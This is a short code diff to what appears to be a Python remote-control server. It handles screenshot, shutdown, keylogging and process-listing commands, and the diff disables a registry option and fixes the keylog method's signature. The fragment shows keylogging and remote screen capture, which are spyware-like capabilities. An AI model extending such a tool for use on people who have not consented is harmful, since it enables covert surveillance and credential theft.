@@ -80,8 +80,8 @@ class Server:
                     self.screenshot(conn)
                 elif option == "SHUTDOWN":
                     self.shutdown()
-                elif option == "REGISTRY":
-                    self.pc_registry(conn)
+                # elif option == "REGISTRY":
+                #     self.pc_registry(conn)
                 elif option == "KEYLOG":
                     self.keylog(conn)
                 elif option == "PROCESS":
@@ -312,7 +312,7 @@ class Server:
         self.nw.write(s)
         self.nw.flush()
 
-    def keylog(self):
+    def keylog(self, conn):
         self.tklog = threading.Thread(target=Keylog.startKLog)
         s = ""
         self.tklog.start()
